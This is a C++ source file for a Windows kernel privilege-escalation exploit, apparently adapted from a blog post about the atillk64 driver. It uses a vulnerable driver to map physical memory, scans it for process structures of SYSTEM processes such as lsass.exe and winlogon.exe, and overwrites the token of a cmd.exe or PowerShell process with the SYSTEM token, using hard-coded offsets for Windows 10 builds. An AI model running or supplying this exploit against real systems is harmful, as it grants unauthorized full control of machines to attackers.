#include "helpers.h"
#include "winver.h"

/*
* 
* The code below was adapted from the original code found in the blog post by H0mbre:
* https://h0mbre.github.io/atillk64_exploit/
* 
*/

//#define START_ADDRESS       (INT64)0x7d490000   // based off testing my VM
//#define MAX_ADDRESS         (INT64)0x7d590000   // based off testing my VM

// Number of Proc to get

#define PROC_COUNT 10


// Creating vector of hex representation of ImageFileNames of common 
// SYSTEM processes, eg. 'wmlms.exe' = hex('exe.smlw')
std::vector<UINT64> SYSTEM_procs = {
    0x78652e7373727363,         // csrss.exe
    0x78652e737361736c,         // lsass.exe
    0x6578652e73736d73,         // smss.exe
    0x7365636976726573,         // services.exe
    0x6b6f72426d726753,         // SgrmBroker.exe
    0x2e76736c6f6f7073,         // spoolsv.exe
    0x6e6f676f6c6e6977,         // winlogon.exe
    0x2e74696e696e6977,         // wininit.exe
    0x6578652e736d6c77,         // wlms.exe
    0x00006d6574737953,         // System
//    0x2e74736f68637673,         // svchost.exe
    0x2e676e45704d734d,         // MsMpEng.exe
};

// Vector of ranges of memory to scan for "Proc" chunks
// -------------------------------------------------------------------------
// DISCALIMER: These ranges are based off my VM, you may need to change them
// to suit your own VM
// In a nutshell, to make this exploit a bit more stable
// -------------------------------------------------------------------------
std::vector<std::pair<INT64, INT64>> ranges = {
	{0x7d490000, 0x7d590000},
	{0x31973000, 0x31973000},
	{0x234a0000, 0x235cf000}
};

VERSION_OFFSETS offsets = { 0 };

VOID PopulateOffsets() {
    if (offsets.ImageFileName != 0) {
        return;
    }
    if (IsBuildNumGreaterOrEqual(18362)) {
        printf("[>] Windows 10 1903 or later\n");
        offsets.UniqueProcessId = 0x440;
        offsets.Token = 0x4b8;
        offsets.ImageFileName = 0x5a8;
    }
    else if (IsBuildNumGreaterOrEqual(10240)) {
        printf("[>] Windows 10 1507 or later\n");
        offsets.UniqueProcessId = 0x2e0;
        offsets.Token = 0x358;
        offsets.ImageFileName = 0x450;
    }
    else {
        printf("[!] Unsupported Windows version\n");
        return;
    }

}

// Mapping memory from a physical address to our process virtual space
BOOL map_memory(HANDLE device_handle, DriverMmMapper driverMappingFunction) {
    DWORD bytes_returned = 0;
    UINT64 system_token_addr = 0;
    UINT64 cmd_token_addr = 0;
    BOOL system_found = false;
    UINT64 last_scanned = 0;

    PopulateOffsets();

    // failures == unsucessful DeviceIoControl calls
    int failures = 0;

    // How many legitamate "Proc" chunks we've found in memory as in
    // we've confirmed they have headers.
    int proc_count = 0;
    int iteration = 0;
    printf("[>] Going fishing for %d \"Proc\" chunks in RAM...\n\n", PROC_COUNT);

    // for each range of memory in vector ranges
    for (auto range : ranges)
    {
        INT64 start_address = range.first;
        INT64 end_address = range.second;

        while (start_address <= end_address)
        {
            DWORDLONG num_of_bytes = 0x1000;
            UINT64 mapped_address = NULL;

            if ((mapped_address = driverMappingFunction(device_handle, start_address, num_of_bytes)) != NULL)
            {
                printf("[>] Mapped pyshical 0x%llx - to kernel: 0x%llx\n", start_address, mapped_address);

                // We will read a 32 bit value at offset i + 0x100 at some point
                // when looking for 0x00B80003, so we can't iterate any further
                // than offset 0xF00 here or we'll get an access violation.
                for (DWORD i = 0; i < (0xF10); i = i + 0x10)
                {
                    UINT64 test_address = mapped_address + i;
                    UINT32 test_value = *(PUINT32)(test_address + 0x4);
                    if (test_value == 0x636f7250)   // "Proc"
                    {
                        printf("[>] Found a potential \"Proc\" chunk at 0x%llx\n", test_address);

                        for (UINT64 x = 0; x < (0x100); x = x + 0x10)
                        {
                            UINT64 header_address = test_address + x;
                            UINT32 header_value = *(PUINT32)header_address;
                            if (header_value == 0x3) //  "Header" ending
                            {
                                // We found a "header", this is a legit "Proc"
                                proc_count++;
                                printf("[>] Found a \"Proc\" chunk at 0x%llx\n", header_address);

                                // This is the literal physical mem addr for the
                                // "Proc" pool tag
                                UINT64 temp_addr = start_address + i;
                                last_scanned = temp_addr;

                                DWORD offset = i + x;
                                if (offset > offsets.ImageFileName) {
                                    header_address = driverMappingFunction(device_handle, temp_addr, num_of_bytes);
                                    offset = 0;
                                }

                                UINT64 tmp_token = NULL;

                                if (parse_proc(header_address, 0, &tmp_token, &system_found)) {
                                    if (tmp_token != NULL) {
                                        if (system_found && system_token_addr == NULL) {
                                            system_token_addr = tmp_token;
                                        }
                                        else if(!system_found && cmd_token_addr == NULL) {
                                            cmd_token_addr = tmp_token;
                                        }
                                    }
                                }
                                
                                if (proc_count == PROC_COUNT)
                                {
                                    start_address = end_address;
                                    break;
                                }
                            }
                        }
                    }
                }
                iteration++;
            }
            else
            {
                // DeviceIoControl failed
                iteration++;
                failures++;
            }
            if (proc_count == PROC_COUNT)
            {
                printf("[>] Found %d \"Proc\" chunks\n", PROC_COUNT);
                break;
            }

            // Advance to the next 0x1000 bytes
            start_address += 0x1000;
        }
    }
    
    printf("[>] \"Proc\" chunks found\n");
    printf("    - Failed DeviceIoControl calls: %d\n", failures);
    printf("    - Total DeviceIoControl calls: %d\n\n", iteration);
    getchar();

    if ((!cmd_token_addr) or (!system_token_addr))
    {
        printf("[!] Token swapping requirements not met.\n");
        printf("[!] Last physical address scanned: 0x%llx\n", last_scanned);
        printf("[!] Better luck next time!\n");
        return false;
    }
    else
    {
        *(PINT64)cmd_token_addr = system_token_addr;
        printf("[>] SYSTEM and cmd.exe token info found, swapping tokens...\n");
        return false;
    }

    return true;
}


BOOL parse_proc(UINT64 allocation_address, DWORD proc_offset, PUINT64 pToken, PBOOL isSystem) {

    UINT64 mapped_address = NULL;
    bool found = false;
    
    PopulateOffsets();

    UINT64 imagename_address = allocation_address + proc_offset
        + offsets.ImageFileName; //ImageFileName
    UINT64 imagename_value = *(PUINT64)imagename_address;

    UINT64 proc_token_addr = allocation_address + proc_offset
        + offsets.Token; //Token
    UINT64 proc_token = *(PUINT64)proc_token_addr;

    UINT64 pid_addr = allocation_address + proc_offset
        + offsets.UniqueProcessId; //UniqueProcessId
    DWORD pid_value = *(PDWORD)pid_addr;

    // See if the ImageFileName 64 bit hex value is in our vector of
    // common SYSTEM processes
    int sys_result = count(SYSTEM_procs.begin(), SYSTEM_procs.end(), imagename_value);
    if (sys_result != 0 and found == false)
    {
        *pToken = proc_token;
        printf("[>] SYSTEM process found!\n");
        printf("    - ImageFileName value: %s\n", (char*)imagename_address);
        printf("    - Token value: 0x%llx\n", proc_token);
        printf("    - Token address: 0x%llx\n", proc_token_addr);
        printf("    - UniqueProcessId: 0x%u\n\n", pid_value);
        *isSystem = true;
        found = true;
    }
    else if (imagename_value == 0x6568737265776f70 or
        imagename_value == 0x6578652e646d63)  // powershell or cmd
    {
        *pToken = proc_token_addr;
        printf("[>] cmd.exe process found!\n");
        printf("    - ImageFileName value: %s\n", (char*)imagename_address);
        printf("    - Token value: 0x%llx\n", proc_token);
        printf("    - Token address: 0x%llx\n", proc_token_addr);
        printf("    - UniqueProcessId: 0x%u\n\n", pid_value);
        *isSystem = false;
        found = true;
    }
    else {
        printf("[>] Useless process found!\n");
        printf("    - ImageFileName value: 0x%llx\n", imagename_value);
        printf("    - ImageFileName char value: %s\n", (char*)imagename_address);
        printf("    - Token value: 0x%llx\n", proc_token);
        printf("    - Token address: 0x%llx\n", proc_token_addr);
        printf("    - UniqueProcessId: 0x%u\n\n", pid_value);
    }
       
	return found;
}